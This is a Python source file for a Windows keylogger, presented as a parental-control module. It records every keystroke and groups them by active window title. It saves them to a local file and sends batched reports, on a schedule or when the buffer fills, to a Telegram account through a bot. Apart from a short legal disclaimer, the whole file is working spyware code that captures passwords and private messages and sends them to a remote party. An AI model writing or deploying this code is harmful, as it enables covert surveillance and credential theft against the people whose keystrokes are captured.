"""
Keylogger Module — Parental Control
Logs keystrokes grouped by active window (application + title).
Sends batched reports to Telegram on schedule or on demand.

⚠️ Legal Notice: Use only on devices you own or have explicit written
permission to monitor. Designed for parental control of minor children's
devices.

Developer: TsByin
Version: 12.0
"""

import os
import time
import logging
import threading
import ctypes
from datetime import datetime
from collections import defaultdict
from threading import Event

logger = logging.getLogger(__name__)

# Try to import pynput; fall back gracefully
try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False
    logger.warning("pynput not installed — keylogger unavailable. Run: pip install pynput")


# ==============================================================================
# KEY HELPERS
# ==============================================================================

_SPECIAL_KEYS = {
    "Key.space": " ",
    "Key.enter": "\n",
    "Key.tab": "\t",
    "Key.backspace": "[⌫]",
    "Key.delete": "[DEL]",
    "Key.shift": "",
    "Key.shift_r": "",
    "Key.ctrl_l": "",
    "Key.ctrl_r": "",
    "Key.alt_l": "",
    "Key.alt_r": "",
    "Key.caps_lock": "[CAPS]",
    "Key.esc": "[ESC]",
    "Key.up": "[↑]",
    "Key.down": "[↓]",
    "Key.left": "[←]",
    "Key.right": "[→]",
    "Key.home": "[Home]",
    "Key.end": "[End]",
    "Key.page_up": "[PgUp]",
    "Key.page_down": "[PgDn]",
    "Key.f1": "[F1]",
    "Key.f2": "[F2]",
    "Key.f3": "[F3]",
    "Key.f4": "[F4]",
    "Key.f5": "[F5]",
    "Key.f6": "[F6]",
    "Key.f7": "[F7]",
    "Key.f8": "[F8]",
    "Key.f9": "[F9]",
    "Key.f10": "[F10]",
    "Key.f11": "[F11]",
    "Key.f12": "[F12]",
}


def _key_to_str(key) -> str:
    """Convert a pynput Key or KeyCode to a printable string."""
    k = str(key)
    if k in _SPECIAL_KEYS:
        return _SPECIAL_KEYS[k]
    # Regular character  — strip surrounding quotes pynput adds
    if k.startswith("'") and k.endswith("'"):
        return k[1:-1]
    # Fallback: show as [KEY]
    return f"[{k}]"


def _get_active_window_title() -> str:
    """Get title of the currently focused window (Windows only)."""
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buf = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
        title = buf.value.strip() or "Unknown"
        return title
    except Exception:
        return "Unknown"


# ==============================================================================
# KEYLOGGER CLASS
# ==============================================================================

class Keylogger:
    """
    Window-aware keylogger for parental control.
    Groups keystrokes by (window_title) and sends batched reports.
    """

    def __init__(self, bot, admin_id: int, base_dir: str,
                 send_interval: int = 300, max_buffer_chars: int = 4000):
        """
        Args:
            bot:              TeleBot instance
            admin_id:         Telegram user ID to send reports to
            base_dir:         Directory to persist log files
            send_interval:    Seconds between automatic Telegram reports (default 5 min)
            max_buffer_chars: Force-send when buffer exceeds this size
        """
        self.bot = bot
        self.admin_id = admin_id
        self.base_dir = base_dir
        self.send_interval = send_interval
        self.max_buffer_chars = max_buffer_chars

        # {window_title: [chars]}
        self._buffer: dict = defaultdict(list)
        self._current_window: str = "Unknown"
        self._lock = threading.Lock()
        self._running = False
        self._listener = None
        self._sender_thread = None
        self._log_file = os.path.join(base_dir, "keylog.txt")
        self._stop_event = Event()

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def start(self):
        """Start keylogger listener and auto-sender thread."""
        if not PYNPUT_AVAILABLE:
            logger.error("Cannot start keylogger: pynput not installed")
            return False
        if self._running:
            return True

        self._running = True
        self._stop_event.clear()
        self._listener = keyboard.Listener(on_press=self._on_press)
        self._listener.daemon = True
        self._listener.start()

        self._sender_thread = threading.Thread(
            target=self._auto_sender_loop, daemon=True
        )
        self._sender_thread.start()
        logger.info("Keylogger started")
        return True

    def stop(self):
        """Stop keylogger."""
        self._running = False
        self._stop_event.set()  # wake up _auto_sender_loop immediately
        if self._listener:
            try:
                self._listener.stop()
            except Exception:
                pass
        logger.info("Keylogger stopped")

    def is_running(self) -> bool:
        return self._running

    def get_report(self) -> str:
        """Return current buffer as a formatted report string (does NOT clear)."""
        with self._lock:
            if not self._buffer:
                return ""
            lines = []
            for window, chars in self._buffer.items():
                text = "".join(chars)
                if text.strip():
                    lines.append(f"🪟 [{window[:60]}]\n{text}\n")
            return "\n".join(lines)
    def _get_and_clear_report(self) -> str:
        """Atomically read the current buffer AND clear it (prevents duplicate sends)."""
        with self._lock:
            if not self._buffer:
                return ""
            lines = []
            for window, chars in self._buffer.items():
                text = "".join(chars)
                if text.strip():
                    lines.append(f"🪩 [{window[:60]}]\n{text}\n")
            self._buffer.clear()  # clear inside the same lock — atomic
            return "\n".join(lines)
    def flush_and_send(self, label: str = "auto") -> bool:
        """Send current buffer to Telegram and clear it.
        Uses atomic get+clear to prevent duplicate sends when called concurrently
        (e.g. scheduled flush + buffer_full flush racing).
        """
        report = self._get_and_clear_report()  # atomic: get AND clear in one lock
        if not report:
            return False

        # Save to file first
        self._append_to_log(report)

        # Send to Telegram (split if too long)
        header = (
            f"⌨️ **Keylog Report** `[{label}]`\n"
            f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"{'─' * 30}\n"
        )
        full = header + report
        try:
            if len(full) <= 4000:
                self.bot.send_message(
                    self.admin_id, full, parse_mode="Markdown"
                )
            else:
                # Send as file
                import io
                bio = io.BytesIO(full.encode("utf-8"))
                bio.name = f"keylog_{label}_{datetime.now().strftime('%H%M%S')}.txt"
                self.bot.send_document(
                    self.admin_id, bio,
                    caption=f"⌨️ Keylog [{label}] — {datetime.now().strftime('%H:%M:%S')}"
                )
            logger.info(f"Keylog sent ({label}): {len(full)} chars")
        except Exception as e:
            logger.error(f"Keylog send failed: {e}")
            return False

        # Buffer already cleared atomically in _get_and_clear_report()
        return True

    def get_log_file_path(self) -> str:
        return self._log_file

    # ------------------------------------------------------------------
    # Internal
    # ------------------------------------------------------------------

    def _on_press(self, key):
        """pynput callback — called on every key press."""
        if not self._running:
            return False   # stops the listener

        char = _key_to_str(key)

        # Detect window switch
        title = _get_active_window_title()

        with self._lock:
            if title != self._current_window:
                self._current_window = title
                # Add a separator when window changes
                if char:
                    self._buffer[title].append(char)
            else:
                if char:
                    self._buffer[title].append(char)

            # Force-flush if buffer is very large
            total_chars = sum(len(v) for v in self._buffer.values())

        if total_chars >= self.max_buffer_chars:
            threading.Thread(
                target=self.flush_and_send,
                args=("buffer_full",),
                daemon=True
            ).start()

    def _auto_sender_loop(self):
        """Periodically send accumulated keystrokes."""
        while self._running:
            # Use Event.wait instead of sleep — responds to stop() immediately
            self._stop_event.wait(self.send_interval)
            if not self._running:
                break
            self._stop_event.clear()
            try:
                self.flush_and_send("scheduled")
            except Exception as e:
                logger.error(f"Auto-sender error: {e}")

    def _append_to_log(self, text: str):
        """Append report to persistent log file."""
        try:
            with open(self._log_file, "a", encoding="utf-8") as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"TIME: {datetime.now()}\n")
                f.write(text)
        except Exception as e:
            logger.warning(f"Keylog file append failed: {e}")


# ==============================================================================
# SINGLETON ACCESSOR
# ==============================================================================

_keylogger_instance: Keylogger | None = None


def get_keylogger(bot=None, admin_id=None, base_dir=None) -> Keylogger | None:
    """Get or create the global Keylogger instance."""
    global _keylogger_instance
    if _keylogger_instance is None:
        if bot is None or admin_id is None or base_dir is None:
            return None
        _keylogger_instance = Keylogger(bot, admin_id, base_dir)
    return _keylogger_instance

# ════════════════════════════════════════════════════════════
# Developer: TsByin
# Module: Keylogger — Parental Control (window-aware)
# ════════════════════════════════════════════════════════════
